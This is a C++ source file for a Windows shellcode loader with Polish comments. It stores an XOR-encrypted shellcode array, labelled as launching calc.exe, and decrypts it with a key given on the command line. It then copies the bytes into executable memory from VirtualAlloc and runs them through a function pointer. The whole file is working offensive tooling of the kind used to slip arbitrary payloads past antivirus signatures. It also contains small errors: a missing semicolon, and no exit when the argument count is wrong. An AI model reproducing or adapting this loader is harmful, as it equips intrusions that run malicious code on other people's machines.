#include <iostream>
#include <Windows.h>
#include <cstring>
#include <cstdio>

using namespace std;

unsigned char* decryptShellcode(unsigned char encryptedShellcode[], int shellcodeLength, unsigned char xorKey) {
  unsigned char* decryptedShellcode = new unsigned char[shellcodeLength];
  
  // Decrypt each hex character using XOR function
  for (int i = 0; i < shellcodeLength; i++) {
    decryptedShellcode[i] = encryptedShellcode[i] ^ xorKey;
  }

  return decryptedShellcode;
}

int main(int argc, char **argv) {

  if (argc != 2) {
    printf("usage: decrypt_loader.exe <key>")
  }

  // Define your shellcode as a char array
  // run calc.exe
  unsigned char shellcode[] = "\x23\x4f\x29\x46\x8a\x9b\x71\xce\x21\xf1\x9a\x21\xf1\xa6\x21\xf1\xb6\x21\xb1\x21\xb1\x21\xe9\xa2\x23\xef\x56\x21\xf2\x96\xab\x69\x21\xf1\xd2\xab\x69\x21\xd1\x8a\xab\x6d\x23\xd7\x52\x21\xe1\x8e\xab\x6b\x23\xe7\x5e\x21\xf9\xb6\xab\x68\x23\xff\x5a\x21\xf9\xbe\x23\xff\x46\x41\x98\x9b\x6a\x21\xff\x46\x21\xd7\x52\x21\xdf\xb2\x9b\x63\x56\x21\x96\x2d\xa9\xd7\x56\xcc\x29\x6b\xa2\x59\x0c\xde\xaf\xea\x93\x7a\xd8\x4e\x21\xe7\x5e\x21\xff\x5a\xcc\x21\xae\xeb\x21\xae\x28\xa9\xef\x56\x69\x10\xd2\xd2\xcf\xc9\x6b\x40\xa2\xf8\xc2\xfd\xc3\xc4\xef\x23\xcf\xb2\x42\x12\x55\x55\x55\x9b\x63\xfb\xc2\x84\xcf\xd2\xcf\xc2\xc9\xcb\xc6\xc9\x23\x49\xeb\xfb\xf9\x55\x7a\x9b\x63\x13\xab\xcf\xd9\xd9\x6b\x43\xa2\xfb\xc2\xfa\xd8\xc5\xc9\xc2\xef\xd2\xc3\xde\x23\xcf\xb2\x42\x2d\x55\x55\x55\x9b\x78\xf8\x55\x7a";

  int shellcodeLength = sizeof(shellcode);

  // unsigned char xorKey = 0xAA;
  unsigned char xorKey = atoi(argv[1]);

  unsigned char* decryptedShellcode = decryptShellcode(shellcode, shellcodeLength, xorKey);

  // wykonanie zdeszyfrowanego shellcodu
  LPVOID exec_mem = VirtualAlloc(NULL, shellcodeLength, MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);
  if (exec_mem == NULL) {
    cout << "Nie udalo sie zaalokowac pamieci!" << endl;
    return -1;
  }
  memcpy(exec_mem, decryptedShellcode, shellcodeLength);

  void(*func)() = (void(*)())exec_mem;
  func();

  // zwolnienie pamieci
  VirtualFree(exec_mem, 0, MEM_RELEASE);

  // Deallocate memory used by the encrypted shellcode array
  delete[] decryptedShellcode;

  return 0;
}